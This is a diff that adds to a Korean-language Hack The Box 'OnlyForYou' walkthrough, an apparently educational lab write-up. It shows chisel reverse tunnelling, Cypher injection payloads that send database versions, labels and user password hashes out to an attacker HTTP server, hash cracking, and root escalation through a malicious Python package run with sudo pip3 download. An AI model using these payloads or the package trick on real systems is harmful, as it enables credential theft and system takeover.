@@ -568,18 +568,16 @@ $ ./chisel server -p 8000 --reverse
 그 후, 웹 셸이 연결된 대상 서버에서 **Client 모드**로 내부 포트를 바깥으로 포워딩하였다:
 
 ```bash
-www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
+www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:socks
 ```
 
 이후 공격자 측 `chisel` 서버 터미널에서 아래와 같이 포트가 정상적으로 포워딩되고 있음을 확인할 수 있다:
 
 ```bash
-2025/10/26 15:53:15 server: Reverse tunnelling enabled
-2025/10/26 15:53:15 server: Fingerprint Drswy/YRWz4T9JsG/ziXlFKq02cOs3cIs8yRj5BxSbo=
-2025/10/26 15:53:15 server: Listening on http://0.0.0.0:8000
-2025/10/26 15:55:19 server: session#1: tun: proxy#R:3000=>3000: Listening
-2025/10/26 15:55:19 server: session#1: tun: proxy#R:8001=>8001: Listening
-2025/10/26 15:55:19 server: session#1: tun: proxy#R:7474=>7474: Listening
+2025/10/26 20:11:44 server: Reverse tunnelling enabled
+2025/10/26 20:11:44 server: Fingerprint bUolgIFuElUSVTLiVGDGJALUN6RbCb+fBrAX2u3Jyew=
+2025/10/26 20:11:44 server: Listening on http://0.0.0.0:8000
+2025/10/26 20:12:30 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
 
 ### Exploring Forwarded Web Applications
@@ -605,3 +603,169 @@ www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:3000:127.0.
 로그인 페이지에서 `admin/admin` 을 사용한 결과, 로그인에 성공하였고 `/dashboard` 경로로 리다이렉트되었다:
 
 ![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-dashboard.png)
+
+`/dashboard` 내 Tasks 섹션에서 **Migrated to a new database (neo4j)** 항목을 통해, 현재 시스템이 `Neo4j` 데이터베이스를 사용하고 있음을 확인할 수 있다.
+
+> **[Neo4j](https://neo4j.com/product/cypher-graph-query-language/)는 Cypher 쿼리 언어를 사용하는 그래프 기반 데이터베이스이다.**
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-tasks.png)
+
+`/employees` 페이지에서는 직원 정보를 조회할 수 있는 검색창과 테이블 인터페이스가 제공된다.
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-employees.png)
+
+### Cypher Injection
+
+검색창에 `a` 를 입력하면, 이름에 해당 문자가 포함된 직원들의 정보가 출력된다.
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/only4you-search.png)
+
+이후 `' or '1'='1` 과 같은 일반적인 인젝션 문자열을 입력하더라도 동일한 결과가 출력되는 것으로 보아, 사용자 입력이 적절하게 필터링되지 않고 내부 **Cypher 쿼리에 직접 반영되고 있음**을 알 수 있다.
+
+*Neo4j는 일반적인 SQL과 달리 Bolt 프로토콜(`7687`)을 통해 쿼리를 처리한다.*
+
+`LOAD CSV` 구문을 통해 외부 서버에 요청을 발생시키기 위해 로컬 터미널에서 `HTTP 서버(포트 9999)`를 열고 수신 대기하였다:
+
+```bash
+$ python3 -m http.server 9999
+```
+
+> **Cypher Injection** 에 대한 자세한 설명은 [이 문서](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits)를 참고하였다.
+
+우선 서버 정보를 알아내기 위해 아래 페이로드를 실행하였다:
+
+```cypher
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.20:9999/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+```
+
+스크립트 실행 결과, 내 Python HTTP 서버에는 다음과 같은 요청이 수신되었다:
+
+```http
+10.10.11.210 - - [26/Oct/2025 17:46:20] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
+10.10.11.210 - - [26/Oct/2025 17:46:20] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
+```
+
+이를 통해 서버 측에서 `CALL dbms.components()` 결과가 외부 요청에 포함되어 전달되고 있음을 확인할 수 있으며, 이는 Cypher 인젝션을 통해 서버 측 정보가 외부로 노출 가능한 상태였음을 확인할 수 있었다.
+
+이후, 현재 데이터베이스에서 사용 중인 label(컬럼) 을 확인하기 위해 다음과 같은 페이로드를 삽입하였다:
+
+```cypher
+' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.20:9999/?l='+label as l RETURN 0 as _0 //
+```
+
+그 결과, 나의 HTTP 서버에는 다음과 같은 요청이 수신되었다:
+
+```http
+10.10.11.210 - - [26/Oct/2025 18:10:20] "GET /?l=user HTTP/1.1" 200 -
+10.10.11.210 - - [26/Oct/2025 18:10:21] "GET /?l=employee HTTP/1.1" 200 -
+```
+
+이를 통해 현재 DB에 존재하는 label로 `user`, `employee` 가 존재함을 확인할 수 있었다.
+
+각 `user` 노드의 속성을 반복 탐색하며 외부 서버로 유출하기 위해, 다음과 같은 페이로드를 삽입하였다:
+
+```cypher
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.20:9999/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
+이후, 나의 HTTP 서버에서는 다음과 같은 요청이 수신되었다:
+
+```http
+10.10.11.210 - - [26/Oct/2025 18:15:52] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [26/Oct/2025 18:15:52] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [26/Oct/2025 18:15:53] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [26/Oct/2025 18:15:53] "GET /?username=john HTTP/1.1" 200 -
+```
+
+결국 `user` 노드에 저장된 `username`, `password` 값이 그대로 외부 요청을 통해 노출되었다.
+
+### Hashcrack
+
+[CrackStation](https://crackstation.net/) 웹 사이트를 통해 `admin`, `john` 계정의 해시를 복호화하는 데 성공하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/hashcrack.png)
+
+이후 복호화한 비밀번호를 이용하여 `ssh`를 통해 `john` 계정으로 접속을 시도한 결과, 정상적으로 셸에 접근하는 데 성공하였다.
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/john-shell.png)
+
+## john → root Lateral Movement
+
+### Enumerating sudo Privileges
+
+`john` 사용자로 `sudo -l` 명령어를 실행한 결과, 다음과 같은 권한이 부여되어 있었다:
+
+```bash
+john@only4you:~$ sudo -l
+
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+```
+
+`john` 계정이 비밀번호 없이 `root` 권한으로 `/usr/bin/pip3 download` 명령을 실행할 수 있다
+
+내부 포트 `3000`은 위에서 확인한 **Gogs 서버**로 확인되었으며, `john` 계정은 해당 서비스에 로그인한 뒤, `.tar.gz` 형식의 **악성 Python 패키지를 업로드**할 수 있다.
+
+> `pip3 download` 명령어는 패키지를 설치하지 않고 다운로드만 수행하지만,  
+> 이 과정에서 내부적으로 `setup.py egg_info`를 실행하여 패키지의 메타데이터를 수집한다.  
+> 이때 `setup.py` 상단의 코드가 실제로 실행되므로, 악성 코드가 포함된 경우 권한 상승이 발생할 수 있다.
+
+### Gaining root via Malicious Package Execution
+
+`john` 계정으로 Gogs 서버에 로그인한 뒤, `Test`라는 이름의 레포지토리가 존재하는 것을 확인하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/john-test.png)
+
+해당 레포지토리는 비공개(`Private`) 상태였으나, 설정 페이지에서 `Visibility` 항목의 체크박스를 해제하여 공개 레포지토리로 변경하였다: 
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/visibility.png) 
+
+> Gogs에 업로드할 악성 `.tar.gz` 패키지를 만들기 위해 [this_is_fine_wuzzi](https://github.com/wunderwuzzi23/this_is_fine_wuzzi/) 도구를 이용하였다.
+
+먼저 다음과 같이 클론하였다:
+
+```bash
+$ git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi/
+```
+
+그 후, `setup.py` 파일을 열어 `import os`를 추가하고, `RunEggInfoCommand` 클래스에 리버스 셸 명령어를 삽입하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/setup-reverse.png)
+
+이후 `python -m build` 명령어를 이용해 Python 패키지를 빌드하였다:
+
+```bash
+$ python -m build 
+```
+
+빌드 완료 후 `dist` 디렉토리에 `.whl` 파일과 `.tar.gz` 파일이 생성된 것을 확인할 수 있다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/build.png)
+
+이제 `john` 사용자의 레포지토리로 돌아가 악성 `.tar.gz` 파일 `this_is_fine_wuzzi-0.0.1.tar.gz` 업로드를 진행하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/upload.png)
+
+업로드를 완료한 뒤, 로컬 터미널에서 리버스 셸을 수신 대기하기 위해 `nc` 명령어를 실행하였다:
+
+```bash
+$ nc -lvnp 9002
+```
+
+이후 `john` 계정의 터미널로 돌아가, 다음 `sudo` 명령어를 실행하였다:
+
+```bash
+john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+```
+
+그 결과, `root` 권한의 리버스 셸 획득에 성공하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/root.png)
+
+최종적으로 `/root/root.txt` 파일을 읽어 플래그를 획득하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/flag.png)
+
